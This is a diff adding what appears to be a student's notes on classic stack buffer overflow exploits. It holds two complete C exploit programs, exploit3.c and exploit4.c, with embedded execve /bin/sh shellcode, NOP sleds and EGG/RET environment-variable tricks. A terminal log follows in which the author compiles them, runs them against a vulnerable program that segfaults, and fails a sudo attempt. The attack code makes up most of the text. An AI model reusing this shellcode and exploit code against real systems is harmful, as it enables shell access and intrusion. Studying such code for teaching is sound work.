@@ -1,0 +1,172 @@
+exploit3.c
+-------------------------------------------------------------
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+#define DEFAULT_OFFSET                    0
+#define DEFAULT_BUFFER_SIZE             512
+#define NOP                            0x90
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+return 0;
+}
+
+int main(int argc, char *argv[]) {
+  char *buff, *ptr;
+  unsigned int *addr_ptr, addr;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int i;
+
+  if (argc > 1) bsize  = atoi(argv[1]);
+  if (argc > 2) offset = atoi(argv[2]);
+
+  if (!(buff = malloc(bsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+
+  addr = get_sp() - offset;
+  printf("Using address: 0x%x\n", addr);
+
+  ptr = buff;
+  addr_ptr = (unsigned int *) ptr;
+  for (i = 0; i < bsize; i+=4)
+    *(addr_ptr++) = addr;
+
+  for (i = 0; i < bsize/2; i++)
+    buff[i] = (char)NOP;
+
+  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+
+  buff[bsize - 1] = '\0';
+
+  memcpy(buff,"EGG=",4);
+  putenv(buff);
+  system("/bin/bash");
+return 0;
+}
+
+-------------------------------------------------------
+gcc -D_XOPEN_SOURCE -ansi -pedantic -Wall exploit3.c will run without errors.  the extra flag -D_XOPEN_SOURCE is to get rid of the warning for implicit declaration of 'putenv'.
+
+exploit4.c
+--------------------------------------------------------------
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+#define DEFAULT_OFFSET                    0
+#define DEFAULT_BUFFER_SIZE             512
+#define DEFAULT_EGG_SIZE               2048
+#define NOP                            0x90
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_esp(void) {
+   __asm__("movl %esp,%eax");
+return 0;
+}
+
+int main(int argc, char *argv[]) {
+  char *buff, *ptr, *egg;
+  unsigned int *addr_ptr, addr;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int i, eggsize=DEFAULT_EGG_SIZE;
+
+  if (argc > 1) bsize   = atoi(argv[1]);
+  if (argc > 2) offset  = atoi(argv[2]);
+  if (argc > 3) eggsize = atoi(argv[3]);
+
+
+  if (!(buff = malloc(bsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+  if (!(egg = malloc(eggsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+
+  addr = get_esp() - offset;
+  printf("Using address: 0x%x\n", addr);
+
+  ptr = buff;
+  addr_ptr = (unsigned int *) ptr;
+  for (i = 0; i < bsize; i+=4)
+    *(addr_ptr++) = addr;
+
+  ptr = egg;
+  for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
+    *(ptr++) = (char)NOP;
+
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+
+  buff[bsize - 1] = '\0';
+  egg[eggsize - 1] = '\0';
+
+  memcpy(egg,"EGG=",4);
+  putenv(egg);
+  memcpy(buff,"RET=",4);
+  putenv(buff);
+  system("/bin/bash");
+return 0;
+}
+---------------------------------------------------------
+gcc -D_XOPEN_SOURCE -ansi -pedantic -Wall exploit4.c will run without errors.  the extra flag -D_XOPEN_SOURCE is to get rid of the warning for implicit declaration of 'putenv'.
+
+ceg42921@knuth:~/Desktop$ gcc -D_XOPEN_SOURCE -ansi -pedantic -Wall exploit3.c
+ceg42921@knuth:~/Desktop$ gcc -D_XOPEN_SOURCE -ansi -pedantic -Wall exploit4.c
+ceg42921@knuth:~/Desktop$ size 3.out
+   text	   data	    bss	    dec	    hex	filename
+   2277	    616	     16	   2909	    b5d	3.out
+ceg42921@knuth:~/Desktop$ gcc -D_XOPEN_SOURCE -ansi -pedantic -Wall exploit3a.c -o 3a.out
+ceg42921@knuth:~/Desktop$ size 3a.out
+   text	   data	    bss	    dec	    hex	filename
+   2176	    616	     16	   2808	    af8	3a.out
+ceg42921@knuth:~/Desktop$ gcc -D_XOPEN_SOURCE -ansi -pedantic -Wall exploit3.c -o 3.out
+ceg42921@knuth:~/Desktop$ size 3a.out
+   text	   data	    bss	    dec	    hex	filename
+   2128	    616	     16	   2760	    ac8	3a.out
+ceg42921@knuth:~/Desktop$ size 3.out
+   text	   data	    bss	    dec	    hex	filename
+   2176	    616	     16	   2808	    af8	3.out
+ceg42921@knuth:~/Desktop$ gcc -D_XOPEN_SOURCE -ansi -pedantic -Wall vulnerable.c -o vulnerable.out
+vulnerable.c:1:6: warning: return type of ‘main’ is not ‘int’ [-Wmain]
+vulnerable.c: In function ‘main’:
+vulnerable.c:5:5: warning: implicit declaration of function ‘strcpy’ [-Wimplicit-function-declaration]
+vulnerable.c:5:5: warning: incompatible implicit declaration of built-in function ‘strcpy’ [enabled by default]
+ceg42921@knuth:~/Desktop$ gcc -D_XOPEN_SOURCE -ansi -pedantic -Wall vulnerable.c -o vulnerable.out
+ceg42921@knuth:~/Desktop$ ./3a.out vulnerable.out
+Using address: 0x0
+Segmentation fault (core dumped)
+ceg42921@knuth:~/Desktop$ ./3.out vulnerable.out
+Using address: 0x0
+Segmentation fault (core dumped)
+ceg42921@knuth:~/Desktop$ mkdir -p /tmp/5 /tmp/Auditor
+ceg42921@knuth:~/Desktop$ mount -o ro /dev/sda5 /temp /5
+mount: only root can do that
+ceg42921@knuth:~/Desktop$ sudo mount -o ro /dev/sda5 /temp/5
+[sudo] password for ceg42921: 
+ceg42921 is not in the sudoers file.  This incident will be reported.
+ceg42921@knuth:~/Desktop$ 
+--------------------------------------LOL! wrong OS!--------------------------------------------
+
+
+
+
+
+
+
